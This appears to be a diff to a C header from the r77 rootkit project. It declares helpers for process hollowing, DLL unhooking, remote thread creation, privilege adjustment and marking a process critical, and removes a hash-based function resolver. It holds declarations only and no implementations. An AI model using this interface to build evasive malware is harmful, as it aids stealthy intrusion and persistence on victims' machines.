@@ -38,6 +38,12 @@ LPCSTR ConvertStringToAString(LPCWSTR str);
 /// A newly allocated LPWSTR with the converted UNICODE_STRING.
 /// </returns>
 LPWSTR ConvertUnicodeStringToString(UNICODE_STRING str);
+/// <summary>
+/// Converts a 32-bit integer value to a string.
+/// </summary>
+/// <param name="value">The value to convert.</param>
+/// <param name="buffer">A buffer of unicode characters to write the result to.</param>
+VOID Int32ToStrW(LONG value, PWCHAR buffer);
 
 /// <summary>
 /// Determines whether the operating system is a 64-bit operating system.
@@ -47,6 +53,14 @@ LPWSTR ConvertUnicodeStringToString(UNICODE_STRING str);
 /// otherwise, FALSE.
 /// </returns>
 BOOL Is64BitOperatingSystem();
+/// <summary>
+/// Determines whether at Windows 10 or greater is installed. This function uses the NT API and does not rely on a manifest file.
+/// </summary>
+/// <returns>
+/// TRUE, if Windows 10 or above is installed;
+/// otherwise, FALSE.
+/// </returns>
+BOOL IsAtLeastWindows10();
 /// <summary>
 /// Determines whether a process is a 64-bit process.
 /// </summary>
@@ -236,15 +250,6 @@ HANDLE CreatePublicNamedPipe(LPCWSTR name);
 /// </returns>
 BOOL IsExecutable64Bit(LPBYTE image, LPBOOL is64Bit);
 /// <summary>
-/// Retrieves a function pointer from the PEB.
-/// </summary>
-/// <param name="moduleHash">The hash of the module name. The module must be loaded.</param>
-/// <param name="functionHash">The hash of the function name.</param>
-/// <returns>
-/// A pointer to the function, or NULL, if the function could not be found.
-/// </returns>
-LPVOID PebGetProcAddress(DWORD moduleHash, DWORD functionHash);
-/// <summary>
 /// Creates a new process using the process hollowing technique.
 /// <para>The bitness of the current process, the created process and the payload must match.</para>
 /// </summary>
@@ -278,5 +283,11 @@ DWORD RvaToOffset(LPBYTE image, DWORD rva);
 /// </summary>
 /// <param name="name">The name of the DLL to unhook.</param>
 VOID UnhookDll(LPCWSTR name);
+
+NTSTATUS NTAPI R77_NtQueryObject(HANDLE handle, OBJECT_INFORMATION_CLASS objectInformationClass, LPVOID objectInformation, ULONG objectInformationLength, PULONG returnLength);
+NTSTATUS NTAPI R77_NtCreateThreadEx(PHANDLE thread, ACCESS_MASK desiredAccess, LPVOID objectAttributes, HANDLE processHandle, LPVOID startAddress, LPVOID parameter, ULONG flags, SIZE_T stackZeroBits, SIZE_T sizeOfStackCommit, SIZE_T sizeOfStackReserve, LPVOID bytesBuffer);
+NTSTATUS NTAPI R77_RtlGetVersion(PRTL_OSVERSIONINFOW versionInformation);
+NTSTATUS NTAPI R77_RtlAdjustPrivilege(ULONG privilege, BOOLEAN enablePrivilege, BOOLEAN isThreadPrivilege, PBOOLEAN previousValue);
+NTSTATUS NTAPI R77_RtlSetProcessIsCritical(BOOLEAN newIsCritical, PBOOLEAN oldIsCritical, BOOLEAN needScb);
 
 #endif
